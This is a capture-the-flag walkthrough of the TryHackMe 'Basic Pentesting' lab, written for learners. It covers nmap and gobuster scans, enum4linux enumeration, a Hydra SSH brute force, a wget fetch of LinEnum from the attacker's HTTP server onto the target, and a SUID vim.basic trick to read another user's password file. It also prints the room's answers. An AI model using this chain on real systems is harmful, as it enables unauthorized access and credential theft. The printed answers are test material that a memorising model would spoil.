# CTF-TryHackMe-Basic_Pentesting

###  Find the services exposed by the machine

The first thing we are asked to do is find the services exposed by the machine. We can use nmap to find open ports and services.\
**nmap -A -T4 10.10.72.81 -oN nmap_initial**\
\
![nmap_Basic_pentesting 2022-01-21 110914](https://user-images.githubusercontent.com/86057471/150501345-127fda31-0ab3-48fa-be66-565319e415c7.png)\
\
We found six open ports and services on the machine.

### What is the name of the hidden directory on the web server(enter name without /)?

We can use a tool called gobuster to find all directories on the webserver we found open in the nmap scan.\
**gobuster dir -u 10.10.62.148 -w /usr/share/wordlists/dirb/common.txt  -oN gobuster**\
\
![gobuster_basicpentesting2022-01-21 111052](https://user-images.githubusercontent.com/86057471/150502129-8a4ce260-1524-4945-b04e-cdd560b13941.png)\
\
We find the hidden directory we were looking for: **devolopment**

### Use brute-forcing to find the username & password

In our nmap scan we found smb open. We can use a tool called enum4linux to bruteforce.\
**enum4linux -a 10.10.62.148**

### What is the username?

Running enum4linux we find two username.
**jan, kay**\
\
![enum4linux_basicpentesting2022-01-21 114847](https://user-images.githubusercontent.com/86057471/150505475-e1ca8ad6-7346-4469-b5d6-194a80a46457.png)

The username the question wanted is **jan**.

### What is the password?

If we go to the devolopment directory we found using gobuster. We find two files, dev.txt and j.txt.\
\
![development_basicpentesting2022-01-22 191336](https://user-images.githubusercontent.com/86057471/150648776-5056a752-5aff-4fef-a06c-b83f8a7c00ea.png)
\
If we open j.txt we get this message:

![jtxt2022-01-22 191413](https://user-images.githubusercontent.com/86057471/150648818-ff3115e0-634b-402c-b32f-a73ee05ae72e.png)\
\
There is a message from K to J, which we can assume is Kay and Jan. Kay is telling Jan that the password Jan is using is very weak.\
When we ran our nmap scan we found port 22 open running **ssh**(What service do you use to access the server). Knowing that Jan is using a weak password we can use a tool called Hydra that can try and brute force the password.

![hydraline_basicpentesting2022-01-22 192230](https://user-images.githubusercontent.com/86057471/150649003-1faeaad3-4d01-4127-976a-38cdebc0875d.png)

After running hydra we get:

![hydrassh_basicpentesting2022-01-22 193118](https://user-images.githubusercontent.com/86057471/150649238-09863ff3-2a20-4378-bb77-c625048e6b6b.png)

We found the password for jan: **armando**

### Enumerate the machine to find any vectors for privilege escalation

Let's start by logging into the machine with ssh using username jan and password armando.

![janshell_basicpentisiting2022-01-22 194312](https://user-images.githubusercontent.com/86057471/150649640-14c1ba6c-8764-4b97-a34c-ebba4960b6c0.png)

If we move into /home we find two directories, jan and kay. if we move into kay we find a pass.bak file but we don't have permission to cat it out.

![kaypass _basicpentsisng2022-01-22 195038](https://user-images.githubusercontent.com/86057471/150649853-9843e7c0-ac0b-4af5-a166-1d6356c9d481.png)


We can use a tool like LinEnum to try and find any vectors for privilege escalation.

Let's first open a new terminal and create a directory called LinEnum.\
In LinEnum we can git clone the repository from github.

![gitlinenum_asicpnetsting2022-01-22 200244](https://user-images.githubusercontent.com/86057471/150650261-5869ed40-02c1-4196-94b6-982e5e095939.png)\

Great, now we have downloaded LinEnum, but we still need to be able to use it in the machine.\
We can set up a http server and use wget to download it to the machine.\
In our terminal we will use python to start a SimpleHTTPServer.

![httpserver_basicpentesting2022-01-22 204346](https://user-images.githubusercontent.com/86057471/150651488-1327f009-c55a-41ab-9aee-ad7fdf871b59.png)

Then in the machine we will use wget to download LinEnum from out terminal: **wget 10.0.0.1:8000/LinEnum.sh**.
We will need to change the permissions before we are able to run it: **chmod +x LinEnum.sh**\
Then run it: **./LinEnum.sh**.\
After running it we can go throught the output.\
We found something interesting:

![suid_basicpentesting2022-01-22 205902](https://user-images.githubusercontent.com/86057471/150651874-82d4771b-9d38-442c-96fd-297376e40564.png)

Great! We can use vim.basic to see the contents of pass.bak:

![vimbasic_basicpentesting2022-01-22 210450](https://user-images.githubusercontent.com/86057471/150652029-f848f46b-f91c-4172-9c7b-73804a4068c3.png)

### What is the final password you obtain?

After running vim.basic we get the contents of pass.bak. The password is **heresareallystrongpasswordthatfollowsthepasswordpolicy$$**

![password_basicpentesting2022-01-22 210736](https://user-images.githubusercontent.com/86057471/150652110-7fca7bce-a9a1-4821-bf1c-3ec7e0dd5c2b.png)















